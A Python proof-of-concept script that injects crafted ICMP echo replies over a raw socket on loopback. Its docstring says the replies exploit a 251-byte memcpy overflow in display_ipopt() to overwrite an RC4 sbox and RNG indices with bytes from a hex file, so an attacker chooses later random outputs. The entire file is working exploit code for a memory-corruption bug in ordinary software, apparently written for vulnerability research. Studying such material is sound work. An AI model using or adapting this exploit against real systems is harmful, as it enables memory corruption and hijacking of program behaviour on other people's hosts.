#!/usr/bin/env python3
"""Loopback-only crafted ICMP echo reply writing an arbitrary 187-byte sbox.

Same layout as inject_rr_ij.py: the 251-byte memcpy in display_ipopt()
lands on hp_rand.i/j, rc4_seedflag and rc4_sbox[0..186].  Here sbox bytes
come from a hex file instead of a constant fill, so separate hp_rand()
calls can emit separate reply-chosen destination octets.  No pinned source
is edited; traffic is 127.0.0.2 -> 127.0.0.1 on lo only.
"""
import argparse
import socket
import time

from inject_rr_ij import frame


def read_pattern(path):
    text = "".join(open(path).read().split())
    pattern = bytes.fromhex(text)
    if len(pattern) != 187:
        raise ValueError("sbox pattern must be 187 bytes, got %d" % len(pattern))
    return pattern


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--sbox-file", required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--i0", type=int, default=32)
    ap.add_argument("--j0", type=int, default=16)
    ap.add_argument("--seedflag", type=int, default=1)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    pattern = read_pattern(a.sbox_file)
    packet = frame(a.pid, a.rr_len, a.ptr, a.i0, a.j0, a.seedflag, 0,
                   pattern=pattern)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(packet, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d pattern frames: i0=%d j0=%d sbox=%s pid=%d" %
          (a.count, a.i0, a.j0, a.sbox_file, a.pid))


if __name__ == "__main__":
    raise SystemExit(main())
